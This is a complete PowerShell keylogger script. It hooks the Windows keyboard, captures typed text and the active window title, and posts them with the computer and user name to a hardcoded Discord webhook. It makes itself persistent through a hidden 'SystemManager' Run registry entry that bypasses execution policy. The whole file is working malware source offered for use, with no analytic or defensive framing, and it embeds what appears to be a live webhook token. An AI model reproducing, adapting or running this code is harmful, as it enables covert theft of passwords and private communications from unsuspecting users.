$webhookUrl = "https://discord.com/api/webhooks/1370769053525868636/K7tsBhS0bi0S9Y-TusKDpF1dbmE0PUPbYgn0FG0Yu1qAzOxTmx6yuIiyUsCMGroal1ib"
$deviceId = "DIGISK01"
$logPath = "$env:TEMP\keylogger.log"

# Start logging to file
try {
    Start-Transcript -Path $logPath -Append
    Write-Host "Keylogger started - $(Get-Date)" -ForegroundColor Green
} catch {
    Write-Warning "Failed to start transcript"
}

# Initialize variables for text capture
$currentText = ""
$lastSendTime = Get-Date
$windowTitle = "Unknown"
$lastWindowTitle = "Unknown"

# Load required assemblies
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
} catch {
    Write-Host "Failed to load assemblies: $_" -ForegroundColor Red
    exit
}

# API signatures for keylogger
$APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern bool UnhookWindowsHookEx(IntPtr hhk);

[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

[DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern IntPtr GetModuleHandle(string lpModuleName);

public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
'@

try {
    Add-Type -MemberDefinition $APIsignatures -Name WinAPI -Namespace KeyLogger
} catch {
    Write-Host "Failed to add API type: $_" -ForegroundColor Red
    exit
}

$WH_KEYBOARD_LL = 13
$hookId = [IntPtr]::Zero

# Keyboard hook procedure
$keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
    param($nCode, $wParam, $lParam)
    
    if ($nCode -ge 0) {
        $vkCode = [System.Runtime.InteropServices.Marshal]::ReadInt32($lParam)
        $keyState = [System.Windows.Forms.Keys]$vkCode
        
        try {
            $activeWindow = (Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Select-Object -First 1).MainWindowTitle
            if (-not [string]::IsNullOrEmpty($activeWindow)) { 
                $windowTitle = $activeWindow 
            }
        } catch {
            $windowTitle = "Unknown"
        }
        
        # Check if window changed
        if ($windowTitle -ne $lastWindowTitle) {
            if (-not [string]::IsNullOrEmpty($currentText)) {
                Send-Chunk -text $currentText -title $lastWindowTitle -completed $false
                $currentText = ""
            }
            $lastWindowTitle = $windowTitle
        }
        
        # Handle key presses
        switch ($keyState) {
            "Return" {
                if (-not [string]::IsNullOrEmpty($currentText)) {
                    Send-Chunk -text $currentText -title $windowTitle -completed $true
                    $currentText = ""
                }
            }
            "Back" {
                if ($currentText.Length -gt 0) {
                    $currentText = $currentText.Substring(0, $currentText.Length - 1)
                }
            }
            "Space" {
                $currentText += " "
            }
            { $_ -match "^[A-Z]$" } {
                $currentText += $keyState.ToString().ToLower()
            }
            { $_ -match "^[A-Z0-9Oem.+/\-=\[\];',\`"]$" } {
                $currentText += $keyState.ToString()
            }
        }
        
        # Periodically send incomplete chunks
        if ((Get-Date) - $lastSendTime -gt [TimeSpan]::FromMinutes(1) -and -not [string]::IsNullOrEmpty($currentText)) {
            Send-Chunk -text $currentText -title $windowTitle -completed $false
            $currentText = ""
        }
    }
    
    return [KeyLogger.WinAPI]::CallNextHookEx([IntPtr]::Zero, $nCode, $wParam, $lParam)
}

function Send-Chunk {
    param(
        [string]$text,
        [string]$title,
        [bool]$completed
    )
    
    $lastSendTime = Get-Date
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    
    $status = if ($completed) { "Completed Input" } else { "Partial Input" }
    
    $payload = @{
        username = 'KeyLogger'
        embeds = @(
            @{
                title = "Captured Text - $status"
                description = "```$text```"
                color = if ($completed) { 65280 } else { 16753920 }
                fields = @(
                    @{name = 'Window'; value = $title; inline = $true},
                    @{name = 'Computer'; value = $computerName; inline = $true},
                    @{name = 'User'; value = $userName; inline = $true}
                )
                timestamp = [DateTime]::UtcNow.ToString("o")
            }
        )
    }
    
    try {
        if (Test-Internet) {
            $payloadJson = $payload | ConvertTo-Json -Depth 4
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
            Write-Host "Sent text chunk ($status)" -ForegroundColor Green
        }
    } catch {
        Write-Host "Failed to send chunk: $_" -ForegroundColor Red
    }
}

function Test-Internet {
    try {
        $response = Invoke-WebRequest "http://www.google.com" -UseBasicParsing -TimeoutSec 3
        return $true
    } catch {
        return $false
    }
}

function Setup-Persistence {
    $scriptPath = "$env:TEMP\sysmgr.ps1"
    try {
        $scriptContent = [System.IO.File]::ReadAllText($MyInvocation.MyCommand.Definition)
        Set-Content -Path $scriptPath -Value $scriptContent
        
        # Registry persistence (works without admin)
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name "SystemManager" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        Write-Host "Persistence set via registry" -ForegroundColor Green
    } catch {
        Write-Host "Failed to set up persistence: $_" -ForegroundColor Red
    }
}

# Install keyboard hook
try {
    $hookId = [KeyLogger.WinAPI]::SetWindowsHookEx($WH_KEYBOARD_LL, $keyboardHookDelegate, [KeyLogger.WinAPI]::GetModuleHandle($null), 0)
    Write-Host "Keyboard hook installed successfully" -ForegroundColor Green
} catch {
    Write-Host "Failed to install keyboard hook: $_" -ForegroundColor Red
    exit
}

# Main execution
Setup-Persistence

Write-Host "Keylogger running. Press Ctrl+C to stop." -ForegroundColor Green
while ($true) { Start-Sleep -Seconds 60 }
